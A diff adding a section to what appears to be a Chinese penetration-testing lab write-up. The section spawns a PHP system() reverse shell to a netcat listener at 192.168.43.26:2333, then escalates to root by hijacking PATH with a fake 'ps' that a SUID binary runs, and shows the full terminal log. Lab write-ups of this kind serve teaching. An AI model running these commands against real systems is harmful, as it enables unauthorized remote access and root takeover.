+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.45.02.png" style="zoom:50%;">
+
+
+
+<p>kali端监听端口：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> lvp <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>命令详解：</p>
+<p><code>nc -lvp 2333</code> 是一个使用 netcat（通常简称为 nc）这个网络工具的命令，用于在本地计算机上监听端口 2333 的 TCP 连接。</p>
+<ol>
+<li><code>nc</code>：这是调用 netcat 程序的命令，netcat 是一个用于网络通信的简单 Unix 工具，它可以用于读取和写入网络连接。</li>
+<li><code>-l</code>：这个选项告诉 netcat 进入监听模式，准备接受传入的连接。</li>
+<li><code>-v</code>：这个选项是用于启用详细输出模式，它会在屏幕上显示更多的信息，比如连接的状态和任何错误信息。</li>
+<li><code>-p 2333</code>：这个选项指定了 netcat 监听的端口号，这里是 2333。任何想要连接到这个端口的远程系统都会被 netcat 接受。</li>
+</ol>
+</blockquote>
+<p>执行反弹shell的脚本：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system<span class="token punctuation">(</span><span class="token string">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1"'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>命令详解：</p>
+<p>这条命令是一个在PHP环境中执行的系统命令，它利用了PHP的<code>system</code>函数来调用bash shell，并执行一个特定的命令字符串。这个命令字符串是一个创建反向shell的技巧，通常用于渗透测试或恶意软件中。</p>
+<ol>
+<li><code>system</code>：这是PHP的一个函数，用于执行外部命令并显示输出。</li>
+<li><code>'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1"'</code>：这是传递给<code>system</code>函数的命令字符串，它被单引号括起来，表示这是一个单一的字符串参数。</li>
+<li><code>bash -c</code>：这是调用bash shell并执行后面的命令字符串。</li>
+<li><code>'bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1'</code>：这是bash命令，用于创建一个反向shell。<ol>
+<li><code>bash -i</code>：启动一个交互式的bash shell。</li>
+<li><code>&gt;&amp;</code>：这是一个重定向操作符，用于将标准输出（stdout）和标准错误（stderr）合并并重定向到同一个目标。</li>
+<li><code>/dev/tcp/192.168.43.26/2333</code>：这是一个Unix域套接字，用于建立一个到指定IP地址和端口的TCP连接。在这个例子中，它尝试连接到IP地址<code>192.168.43.26</code>的<code>2333</code>端口。</li>
+<li><code>0&gt;&amp;1</code>：这将标准输入（stdin）重定向到标准输出（stdout）。这样做的目的是为了让输入和输出都通过同一个通道，即TCP连接。</li>
+</ol>
+</li>
+</ol>
+<p>这个命令的目的是创建一个反向连接，使得攻击者可以从远程IP地址<code>192.168.43.26</code>的<code>2333</code>端口访问目标机器的shell。这种技术通常被用于绕过防火墙的限制，因为大多数防火墙会允许出站连接。</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.46.26.png" style="zoom:50%;">
+
+<p>kali linux获取反弹的shell</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.49.26.png" style="zoom:30%;">
+
+<h2 id="3-3-权限提升获取root权限"><a href="#3-3-权限提升获取root权限" class="headerlink" title="3.3 权限提升获取root权限"></a>3.3 权限提升获取root权限</h2><p>执行过程如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp
+<span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">&gt;</span> <span class="token function">ps</span> <span class="token comment"># /bin/bash 的权限 -rwxr-xr-x 1 root root </span>
+<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span>
+<span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span> 
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span> <span class="token comment"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span>
+<span class="token builtin class-name">cd</span> /home/jobs
+./shell
+<span class="token comment"># 然后就获得了root权限，可以执行命令了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>具体的执行过程：</p>
+<p>www-data@8e172820ac78:/var/www/html$ cd /tmp<br>cd /tmp<br>www-data@8e172820ac78:/tmp$ ls<br>ls<br>vIjn2Lh<br>vKwfKcp<br>vuPmJKu<br>www-data@8e172820ac78:/tmp$ echo “/bin/bash” &gt; ps<br>echo “/bin/bash” &gt; ps<br>www-data@8e172820ac78:/tmp$ ls<br>ls<br>ps<br>vIjn2Lh<br>vKwfKcp<br>vuPmJKu<br>www-data@8e172820ac78:/tmp$ ls -al ps<br>ls -al ps<br>-rw-r–r– 1 www-data www-data 10 Jan  3 03:00 ps<br>www-data@8e172820ac78:/tmp$ chmod 777 ps<br>chmod 777 ps<br>www-data@8e172820ac78:/tmp$ ls -al ps<br>ls -al ps<br>-rwxrwxrwx 1 www-data www-data 10 Jan  3 03:00 ps<br>www-data@8e172820ac78:/tmp$ echo $PATH<br>echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>www-data@8e172820ac78:/tmp$ export PATH=/tmp:$PATH<br>export PATH=/tmp:$PATH<br>www-data@8e172820ac78:/tmp$ echo $PATH<br>echo $PATH<br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>www-data@8e172820ac78:/tmp$ cd /home/jobs<br>cd /home/jobs<br>www-data@8e172820ac78:/home/jobs$ ls -al<br>ls -al<br>total 32<br>drwxr-xr-x 2 root root  4096 Feb 25  2021 .<br>drwxr-xr-x 1 root root  4096 Feb 25  2021 ..<br>-rw-r–r– 1 root root    75 Feb 25  2021 demo.c<br>-rwsr-xr-x 1 root root 16712 Feb 25  2021 shell<br>www-data@8e172820ac78:/home/jobs$ ./shell<br>./shell<br>id<br>uid=0(root) gid=0(root) groups=0(root),33(www-data)<br>whoami<br>root</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.06.21.png" style="zoom:40%;">
+
+<p>提权成功，获得容器中root权限的shell。</p>
+<blockquote>
+<p>为什么不直接在蚁剑中执行而需要反弹shell呢？</p>
+<ul>
+<li>实践操作会发现，在蚁剑的虚拟终端中无法修改$PATH环境变量。</li>
+</ul>
+<p>export 不奏效。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.19.10.png" style="zoom:50%;">
+
+<p>也没有bashrc文件。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.21.24.png" style="zoom:50%;">
+</blockquote>
 
                 
             </div>
@@ -911,7 +1073,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">110.9k</span>
+                        class="white-color">114.8k</span>
             
             
             
